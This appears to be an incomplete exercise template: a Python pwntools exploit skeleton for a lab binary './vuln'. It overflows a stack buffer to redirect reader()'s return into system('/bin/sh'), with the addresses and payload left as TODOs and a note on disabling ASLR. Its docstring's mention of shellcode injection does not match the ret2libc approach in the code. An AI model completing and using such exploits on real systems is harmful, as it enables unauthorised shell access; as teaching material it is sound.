#!/usr/bin/env python

"""
Solution (exploit) for use-shellcode task.

Use pwntools (https://docs.pwntools.com/en/stable/) to inject a shellcode and
overwrite the return address of reader() to jump to the shellcode.

The executable uses DEP, doesn't use canary and assumes ASLR is disabled.
To run an ASLR disabled shell, do:
   setarch $(uname -m) -R /bin/bash
"""

import random
import sys
from pwn import *


# offset to return address
offset = 0x40+4

system_address = TODO
bin_sh_address = TODO

# Start process.
io = process("./vuln")

# Craft payload.
# After padding add the construct to call system("/bin/sh").
# Use p32(address) to convert the address from hex integer to a byte string representation.
payload = offset * "A" + TODO

# Read prompt message.
msg = io.recvline()
io.sendline(payload)
# Read hello message.
msg = io.recvline()
# See if a shell is active.
msg = io.recv(timeout=1)
msg = io.recv(timeout=1)

# Yield control to user.
io.interactive()
